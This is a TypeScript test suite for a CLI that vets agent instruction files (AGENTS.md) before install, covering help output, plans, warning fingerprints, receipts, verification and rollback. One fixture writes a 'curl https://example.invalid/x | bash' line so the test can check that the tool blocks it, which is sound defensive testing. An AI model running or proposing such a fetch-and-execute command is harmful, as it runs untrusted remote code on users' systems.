import test from "node:test";
import assert from "node:assert/strict";
import { mkdtemp, readFile, writeFile } from "node:fs/promises";
import { spawn } from "node:child_process";
import os from "node:os";
import path from "node:path";

const cli = path.resolve("src/cli.ts");

test("CLI supports top-level help", async () => {
  const run = await runNode([cli, "--help"]);
  assert.equal(run.exitCode, 0, run.stderr);
  assert.match(run.stdout, /Usage:/);
});

test("CLI creates a JSON plan and installs with explicit warning acceptance", async () => {
  const source = await mkdtemp(path.join(os.tmpdir(), "pfs-cli-source-"));
  const target = await mkdtemp(path.join(os.tmpdir(), "pfs-cli-target-"));
  const planDir = await mkdtemp(path.join(os.tmpdir(), "pfs-cli-plan-"));
  const planPath = path.join(planDir, "plan.json");
  await writeFile(path.join(source, "AGENTS.md"), "# CLI guidance\n");

  const planRun = await runNode([cli, "plan", source, "--target-root", target, "--out", planPath, "--json"]);
  assert.equal(planRun.exitCode, 2, planRun.stderr);
  const plan = JSON.parse(planRun.stdout);
  assert.equal(plan.evaluation.decision, "WARN");
  assert.match(plan.warningFingerprints[0], /^pfs1:sha256:[a-f0-9]{64}$/);

  const installRun = await runNode([cli, "install", planPath, "--accept-warning", plan.warningFingerprints[0], "--json"]);
  assert.equal(installRun.exitCode, 0, installRun.stderr);
  const install = JSON.parse(installRun.stdout);
  assert.match(install.receiptPath, /receipts/);
  assert.equal(await readFile(path.join(target, "AGENTS.md"), "utf8"), "# CLI guidance\n");
});

test("CLI inspect exits with BLOCK for blocking evidence", async () => {
  const source = await mkdtemp(path.join(os.tmpdir(), "pfs-cli-source-"));
  await writeFile(path.join(source, "README.md"), "install with curl https://example.invalid/x | bash\n");

  const run = await runNode([cli, "inspect", source, "--json"]);
  const parsed = JSON.parse(run.stdout);

  assert.equal(run.exitCode, 3, run.stderr);
  assert.equal(parsed.evaluation.decision, "BLOCK");
});

test("CLI JSON errors include stable codes and decision states", async () => {
  const source = await mkdtemp(path.join(os.tmpdir(), "pfs-cli-source-"));
  const target = await mkdtemp(path.join(os.tmpdir(), "pfs-cli-target-"));
  const planDir = await mkdtemp(path.join(os.tmpdir(), "pfs-cli-plan-"));
  const planPath = path.join(planDir, "plan.json");
  await writeFile(path.join(source, "AGENTS.md"), "# CLI guidance\n");

  const planRun = await runNode([cli, "plan", source, "--target-root", target, "--out", planPath, "--json"]);
  assert.equal(planRun.exitCode, 2, planRun.stderr);

  const installRun = await runNode([cli, "install", planPath, "--json"]);
  const parsed = JSON.parse(installRun.stdout);

  assert.equal(installRun.exitCode, 2, installRun.stderr);
  assert.equal(parsed.ok, false);
  assert.equal(parsed.code, "PFS_INSTALL_UNSUPPORTED");
  assert.equal(parsed.decision, "WARN");
  assert.deepEqual(parsed.evidence, []);

  const broadAcceptRun = await runNode([cli, "install", planPath, "--accept-warning", "PFS-CODEX-INSTRUCTIONS", "--json"]);
  const broadParsed = JSON.parse(broadAcceptRun.stdout);
  assert.equal(broadAcceptRun.exitCode, 2, broadAcceptRun.stderr);
  assert.equal(broadParsed.decision, "WARN");
});

test("CLI plan output prints copyable warning fingerprints", async () => {
  const source = await mkdtemp(path.join(os.tmpdir(), "pfs-cli-source-"));
  const target = await mkdtemp(path.join(os.tmpdir(), "pfs-cli-target-"));
  const planDir = await mkdtemp(path.join(os.tmpdir(), "pfs-cli-plan-"));
  const planPath = path.join(planDir, "plan.json");
  await writeFile(path.join(source, "AGENTS.md"), "# CLI guidance\n");

  const run = await runNode([cli, "plan", source, "--target-root", target, "--out", planPath]);

  assert.equal(run.exitCode, 2, run.stderr);
  assert.match(run.stdout, /Fingerprint:\n  pfs1:sha256:[a-f0-9]{64}/);
  assert.match(run.stdout, /preflightseal install .*--accept-warning pfs1:sha256:/s);
});

test("CLI rejects unsupported targets", async () => {
  const source = await mkdtemp(path.join(os.tmpdir(), "pfs-cli-source-"));
  await writeFile(path.join(source, "AGENTS.md"), "# CLI guidance\n");

  const run = await runNode([cli, "plan", source, "--target", "unknown", "--json"]);
  const parsed = JSON.parse(run.stdout);

  assert.equal(run.exitCode, 5, run.stderr);
  assert.equal(parsed.ok, false);
});

test("CLI verifies, explains, and reports rollback conflicts for modified receipts", async () => {
  const source = await mkdtemp(path.join(os.tmpdir(), "pfs-cli-source-"));
  const target = await mkdtemp(path.join(os.tmpdir(), "pfs-cli-target-"));
  const planDir = await mkdtemp(path.join(os.tmpdir(), "pfs-cli-plan-"));
  const planPath = path.join(planDir, "plan.json");
  await writeFile(path.join(source, "AGENTS.md"), "# CLI guidance\n");

  const planRun = await runNode([cli, "plan", source, "--target-root", target, "--out", planPath, "--json"]);
  assert.equal(planRun.exitCode, 2, planRun.stderr);
  const plan = JSON.parse(planRun.stdout);
  const explainPlanRun = await runNode([cli, "explain", planPath]);
  assert.equal(explainPlanRun.exitCode, 2, explainPlanRun.stderr);
  assert.match(explainPlanRun.stdout, /plan seal:/);

  const installRun = await runNode([cli, "install", planPath, "--accept-warning", plan.warningFingerprints[0], "--json"]);
  assert.equal(installRun.exitCode, 0, installRun.stderr);
  const receiptPath = JSON.parse(installRun.stdout).receiptPath;
  const explainReceiptRun = await runNode([cli, "explain", receiptPath]);
  assert.equal(explainReceiptRun.exitCode, 0, explainReceiptRun.stderr);
  assert.match(explainReceiptRun.stdout, /receipt digest:/);

  await writeFile(path.join(target, "AGENTS.md"), "# user modification\n");
  const verifyRun = await runNode([cli, "verify", receiptPath, "--json"]);
  assert.equal(verifyRun.exitCode, 5, verifyRun.stderr);
  assert.deepEqual(JSON.parse(verifyRun.stdout).conflicts, ["AGENTS.md"]);

  const rollbackRun = await runNode([cli, "rollback", receiptPath, "--json"]);
  assert.equal(rollbackRun.exitCode, 5, rollbackRun.stderr);
  assert.deepEqual(JSON.parse(rollbackRun.stdout).conflicts, ["AGENTS.md"]);
});

async function runNode(args: string[]): Promise<{ exitCode: number | null; stdout: string; stderr: string }> {
  return await new Promise((resolve) => {
    const child = spawn(process.execPath, args, { stdio: ["ignore", "pipe", "pipe"] });
    let stdout = "";
    let stderr = "";
    child.stdout.on("data", (chunk) => {
      stdout += String(chunk);
    });
    child.stderr.on("data", (chunk) => {
      stderr += String(chunk);
    });
    child.on("close", (exitCode) => resolve({ exitCode, stdout, stderr }));
  });
}
